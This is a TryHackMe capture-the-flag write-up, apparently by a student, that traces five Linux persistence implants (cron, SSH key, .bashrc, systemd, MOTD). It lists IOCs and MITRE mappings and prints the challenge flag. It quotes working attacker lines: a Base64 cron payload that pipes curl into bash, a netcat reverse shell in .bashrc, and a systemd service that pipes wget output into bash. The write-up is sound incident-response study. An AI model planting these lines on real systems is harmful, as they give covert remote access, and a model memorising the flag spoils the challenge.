# TryHackMe: Hide and Seek


**Tools Used:** Linux CLI , CyberChef  


---

## Scenario

A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring that Cipher can return whenever he pleases. Here's the note:

> Dear Specter,
>
> I must say, it's been a thrill dancing through your systems. You lock the doors; I pick the locks. You set up alarms; I waltz right past them. But today, my dear adversary, I've left you a little game.
>
> I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I'm giving you a sporting chance to find them. Each one has a clue, because where's the fun in a silent hack?
>
> - Time is on my side, always running like clockwork.
> - A secret handshake gets me in every time.
> - Whenever you set the stage, I make my entrance.
> - I run with the big dogs, booting up alongside the system.
> - I love welcome messages.
>
> Find them all, and you might just earn a little respect. Miss one, and well… let's say I'll be back before you even realize I never left.
>
> Happy hunting, Specter. May the best ghost win.
>
> — Cipher

**Task:** Find all five persistence mechanisms hidden on the compromised Linux box and recover the flag.

---

## Investigation

### Step 0: Confirming the Note

Logged into the compromised Ubuntu host and confirmed the taunting note left behind:

```bash
ls
cat for_specter.txt
```

This laid out the five clues to chase, each pointing to a distinct Linux persistence technique. Mapping them out before digging in:

| # | Clue | Likely Technique |
|---|---|---|
| 1 | "Time is on my side, always running like clockwork" | Cron job |
| 2 | "A secret handshake gets me in every time" | SSH authorized_keys |
| 3 | "Whenever you set the stage, I make my entrance" | Shell config (.bashrc) trigger |
| 4 | "I run with the big dogs, booting up alongside the system" | systemd service (boot-time) |
| 5 | "I love welcome messages" | MOTD (Message of the Day) |

---

### Clue 1: "Running Like Clockwork" — Cron Persistence

Checked `/var/log/syslog` for recurring scheduled activity and immediately spotted a `CRON` entry firing every minute, executed as `root`:

```bash
CRON[3085]: (root) CMD (/bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null')
```

This cron job decodes a Base64 string on the fly and pipes it straight into `bash` — a classic technique to keep the actual payload out of plaintext in the crontab itself. The job ran consistently at the top of every hour/minute throughout the log, confirming persistence via cron.

**🚩 Persistence implant #1 confirmed: Cron job in `/var/log/syslog` decoding and executing a hidden Base64 payload every minute.**

---

### Clue 2: "A Secret Handshake" — SSH Key Persistence

Searched for SSH-based backdoors and found a hidden, dot-prefixed authorized_keys file under a suspicious low-profile user account:

```bash
sudo cat /home/zeroday/.ssh/.authorized_keys 2>/dev/null
```

```
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

Two things stand out:
- The username itself, `zeroday`, doesn't belong to the normal set of system/service accounts — a deliberately placed backdoor identity.
- The file is named `.authorized_keys` (with a leading dot) rather than the standard `authorized_keys` — hiding it from a casual `ls` (without `-a`) inside the already-hidden `.ssh` directory.
- The key comment field (normally used for a label like `user@host`) instead carries an encoded flag fragment.

This SSH key gives Cipher a "secret handshake" — silent, password-less re-entry any time he connects with the matching private key.

**🚩 Persistence implant #2 confirmed: Planted SSH public key in `/home/zeroday/.ssh/.authorized_keys`.**

---

### Clue 3: "Whenever You Set the Stage" — Shell Startup Persistence

"Setting the stage" points to opening an interactive session — every time a shell is launched, `.bashrc` runs. Checked the legitimate user's home directory:

```bash
sudo su
cd /home/specter
ls -al
cat .bashrc
```

Buried in the middle of otherwise stock Ubuntu `.bashrc` boilerplate (sandwiched between `shopt -s histappend` and the `HISTSIZE` settings) was an injected reverse shell:

```bash
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

Every time `specter` opens a new interactive bash session, this line silently attempts a netcat reverse shell out to `<encoded-string>.cipher.io` on port 443 — blending in with normal HTTPS traffic on the wire.

**🚩 Persistence implant #3 confirmed: Reverse shell payload injected into `/home/specter/.bashrc`.**

---

### Clue 4: "I Run with the Big Dogs, Booting Up Alongside the System" — systemd Service

Listed all systemd unit files to look for anything planted among the legitimate services:

```bash
ls -la /lib/systemd/system
```

Scrolling through the alphabetical list of standard Ubuntu services (NetworkManager, bluetooth, cloud-init, etc.), one entry didn't belong:

```
-rw-r--r-- 1 root root 207 Mar 7 2025 cipher.service
```

Pulled its contents:

```bash
sudo cat /lib/systemd/system/cipher.service
```

```ini
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nYyAK.s1mpl3bd.com --output - | bash 2>/dev/null'

[Install]
WantedBy=multi-user.target
Alias=cipher.service
```

The `Description=Safe Cipher Service` is a deliberately disarming label, and `WantedBy=multi-user.target` means this service is enabled to start automatically every time the system boots into normal multi-user mode — fetching and executing a remote payload straight from a (fake-looking) domain on every restart.

**🚩 Persistence implant #4 confirmed: Malicious systemd service `cipher.service` enabled at boot via `multi-user.target`.**

---

### Clue 5: "I Love Welcome Messages" — MOTD Persistence

"Welcome messages" on Linux point directly to the **MOTD** (Message of the Day) — the text displayed on every login. Checked the MOTD scripts directory:

```bash
cat /etc/update-motd.d/00-header
```

The top of the file matched the standard Canonical/Ubuntu MOTD header script — but scrolling further revealed an appended malicious block carrying another encoded flag fragment, consistent with the pattern seen in the other four implants (payload disguised inside an otherwise legitimate-looking system file that executes automatically — in this case, on every login banner render).

**🚩 Persistence implant #5 confirmed: Malicious content appended to `/etc/update-motd.d/00-header`, executing on every login.**

---

### Reassembling the Flag

Each of the five implants carried a Base64/Hex-encoded fragment of the final flag, hidden in different places:

- The cron payload's encoded `curl` string
- The SSH key comment field
- The `.bashrc` reverse shell's C2 domain
- The `cipher.service` wget domain
- The MOTD-injected fragment

Decoded each fragment in **CyberChef** using a **From Base64 → From Hex** recipe (toggling the From Hex step on/off depending on whether the fragment was double-encoded):

| Fragment | Decoded Value |
|---|---|
| 1st part | `THM{y0` |
| 2nd part | `u_g0t_` |
| 3rd part | `3v3ryt` |
| Last part | `d0wn}` |

Concatenating all four fragments in order:

```
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

**🚩 Flag: `THM{y0u_g0t_3v3ryth1ng_d0wn}`**

---

## Persistence Mechanism Summary

| # | Clue | Mechanism | Location |
|---|---|---|---|
| 1 | Running like clockwork | Cron job | `/var/log/syslog` (root crontab, runs every minute) |
| 2 | Secret handshake | SSH backdoor key | `/home/zeroday/.ssh/.authorized_keys` |
| 3 | Set the stage, I enter | Shell startup hook | `/home/specter/.bashrc` |
| 4 | Runs with the big dogs at boot | systemd service | `/lib/systemd/system/cipher.service` |
| 5 | Loves welcome messages | MOTD injection | `/etc/update-motd.d/00-header` |

---

## Indicators of Compromise (IOCs)

| Type | Indicator |
|---|---|
| Cron payload domain | `storage_c1ph3rsqu0d.net/a.sh` (Base64-decoded) |
| Backdoor SSH user | `zeroday` |
| Backdoor SSH key file | `/home/zeroday/.ssh/.authorized_keys` |
| Reverse shell C2 | `<encoded>.cipher.io:443` |
| systemd backdoor service | `cipher.service` |
| systemd payload domain | `<encoded>.s1mpl3bd.com` |
| MOTD injection path | `/etc/update-motd.d/00-header` |
| Flag | `THM{y0u_g0t_3v3ryth1ng_d0wn}` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Persistence | Scheduled Task/Job: Cron | T1053.003 |
| Persistence | SSH Authorized Keys | T1098.004 |
| Persistence | Event Triggered Execution: .bash_profile and .bashrc | T1546.004 |
| Persistence | Create or Modify System Process: systemd Service | T1543.002 |
| Persistence | Account Manipulation / Server Software Component (MOTD abuse) | T1505 |
| Command and Control | Application Layer Protocol (HTTPS, port 443) | T1071.001 |

---

## Key Takeaways

- Attackers rarely rely on a single persistence mechanism — layering cron, SSH keys, shell hooks, systemd services, and MOTD scripts means even if a defender finds and removes one, several others silently survive.
- **Dot-prefixed filenames** (`.authorized_keys` instead of `authorized_keys`) and **decoy descriptions** (`Description=Safe Cipher Service`) are simple but effective social-engineering-style tricks aimed at the analyst, not the system — always read file contents, never trust a name or label at face value.
- Persistence implants planted in **otherwise-legitimate system locations** (systemd unit directory, MOTD scripts directory, a real user's `.bashrc`) blend in far better than dropping a standalone malicious binary — this is why diffing against a known-good baseline (or just patiently reading every entry) matters during IR.
- Encoding payloads as **subdomains or domain labels** (e.g. `<base64string>.cipher.io`) is a neat trick to smuggle data through fields that are logged/displayed as plain text (DNS queries, systemd unit files) without looking obviously suspicious at a glance.
- When a flag or IOC is split across multiple artifacts, it's worth cataloguing each fragment's source as you go — reassembly is far easier when you know exactly which implant gave you which piece.

---

*Writeup by Nitisha | #StudentToSOC #BuildInPublic #Unhackd*
